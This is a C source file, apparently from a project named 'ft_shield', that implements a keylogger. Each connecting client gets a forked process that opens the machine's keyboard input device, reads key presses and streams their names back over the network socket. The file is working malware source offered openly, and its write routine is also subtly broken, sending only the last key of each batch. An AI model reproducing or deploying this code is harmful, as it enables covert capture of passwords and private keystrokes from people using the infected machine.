#include "ft_shield.h"
#include <linux/input.h>
#include <dirent.h>
#include <ctype.h>
#include <sys/ioctl.h>

char *keycodes[247] = {"RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "MINUS", "EQUAL", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "LEFTBRACE", "RIGHTBRACE", "ENTER", "LEFTCTRL", "A", "S", "D", "F", "G", "H", "J", "K", "L", "SEMICOLON", "APOSTROPHE", "GRAVE", "LEFTSHIFT", "BACKSLASH", "Z", "X", "C", "V", "B", "N", "M", "COMMA", "DOT", "SLASH", "RIGHTSHIFT", "KPASTERISK", "LEFTALT", "SPACE", "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", "SCROLLLOCK", "KP7", "KP8", "KP9", "KPMINUS", "KP4", "KP5", "KP6", "KPPLUS", "KP1", "KP2", "KP3", "KP0", "KPDOT", "ZENKAKUHANKAKU", "102ND", "F11", "F12", "RO", "KATAKANA", "HIRAGANA", "HENKAN", "KATAKANAHIRAGANA", "MUHENKAN", "KPJPCOMMA", "KPENTER", "RIGHTCTRL", "KPSLASH", "SYSRQ", "RIGHTALT", "LINEFEED", "HOME", "UP", "PAGEUP", "LEFT", "RIGHT", "END", "DOWN", "PAGEDOWN", "INSERT", "DELETE", "MACRO", "MUTE", "VOLUMEDOWN", "VOLUMEUP", "POWER", "KPEQUAL", "KPPLUSMINUS", "PAUSE", "SCALE", "KPCOMMA", "HANGEUL", "HANGUEL", "HANJA", "YEN", "LEFTMETA", "RIGHTMETA",
                       "COMPOSE", "STOP", "AGAIN", "PROPS", "UNDO", "FRONT", "COPY", "OPEN", "PASTE", "FIND", "CUT", "HELP", "MENU", "CALC", "SETUP", "SLEEP", "WAKEUP", "FILE", "SENDFILE", "DELETEFILE", "XFER", "PROG1", "PROG2", "WWW", "MSDOS", "COFFEE", "SCREENLOCK", "ROTATE_DISPLAY",
                       "DIRECTION", "CYCLEWINDOWS", "MAIL", "BOOKMARKS", "COMPUTER", "BACK", "FORWARD", "CLOSECD", "EJECTCD", "EJECTCLOSECD", "NEXTSONG", "PLAYPAUSE", "PREVIOUSSONG", "STOPCD", "RECORD", "REWIND", "PHONE", "ISO", "CONFIG", "HOMEPAGE", "REFRESH", "EXIT", "MOVE", "EDIT", "SCROLLUP", "SCROLLDOWN", "KPLEFTPAREN", "KPRIGHTPAREN", "NEW", "REDO", "F13", "F14", "F15", "F16", "F17", "F18", "F19", "F20", "F21", "F22", "F23", "F24", "PLAYCD", "PAUSECD", "PROG3", "PROG4", "ALL_APPLICATIONS", "DASHBOARD", "SUSPEND", "CLOSE", "PLAY", "FASTFORWARD", "BASSBOOST", "PRINT", "HP", "CAMERA", "SOUND", "QUESTION", "EMAIL", "CHAT", "SEARCH", "CONNECT", "FINANCE", "SPORT", "SHOP", "ALTERASE", "CANCEL", "BRIGHTNESSDOWN", "BRIGHTNESSUP", "MEDIA", "SWITCHVIDEOMODE", "KBDILLUMTOGGLE", "KBDILLUMDOWN", "KBDILLUMUP", "SEND", "REPLY", "FORWARDMAIL", "SAVE", "DOCUMENTS", "BATTERY", "BLUETOOTH", "WLAN", "UWB", "UNKNOWN", "VIDEO_NEXT", "VIDEO_PREV", "BRIGHTNESS_CYCLE", "BRIGHTNESS_AUTO", "BRIGHTNESS_ZERO", "DISPLAY_OFF", "WWAN", "WIMAX"};
size_t event_size = sizeof(t_event);

static int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write)
{
	ssize_t written;
	char str[256];
	for (size_t j = 0; j < to_write / event_size; j++)
		snprintf(str, 256, "Key: %s\n", keycodes[events[j].code]);
	written = write(fd, str, 256);
	if (written < 0) /* It can fail with EPIPE (If server closed socket) or with EINTR if it is interrupted by a signal before any bytes were written */
		return written;
	return 1;
}

void	*keylogger_function(t_server *server, int index)
{
	const int	client_fd = server->clients[index].fd;
	pid_t		pid;

	ft_dprintf(2, "clientfd: %d\n", client_fd);

	memset(&server->clients[index], 0, sizeof(t_client));

	pid = fork();
	if (pid < 0) {
		perror("fork");
	}
	else if (pid == 0) {
		setsid();

		close(server->fd);
		dup2(client_fd, STDIN_FILENO);
		dup2(client_fd, STDERR_FILENO);
		dup2(client_fd, STDOUT_FILENO);
		close(client_fd);
		int	kb;
		if (!keyboardFound(DEV_PATH, &kb)) {
			printf("couldn't open keyboard :(\n");
			exit(1);
		}

		t_event kbd_events[event_size * MAX_EVENTS];

		while (1) /* If server closed connection and write failed (SIGPIPE), user sent SIGTERM or another IO error occurred we stop keylogging */
		{
			ssize_t r = read(kb, kbd_events, event_size * MAX_EVENTS);
			if (r < 0) /* If read was interrupted by SIGTERM or another error occurred we stop keylogging */
				break ;
			else
			{
				size_t j = 0;
				for (size_t i = 0; i < r / event_size; i++) /* For each event read */
				{
					if (kbd_events[i].type == EV_KEY && kbd_events[i].value == KEY_PRESSED) /* If a key has been pressed.. */
						kbd_events[j++] = kbd_events[i];                                    /*  Add the event to the beginning of the array */
				}
				if (writeEventsIntoFile(STDOUT_FILENO, kbd_events, j * event_size) < 0)
					break ;
			}
		}
		close(STDOUT_FILENO);
		close(kb);
		exit(0);
	}
	else if (pid > 0) {
		ft_lstadd_back(&server->pids, ft_lstnew((void *)(long)pid));
		close(client_fd);
	}
	return (NULL);
}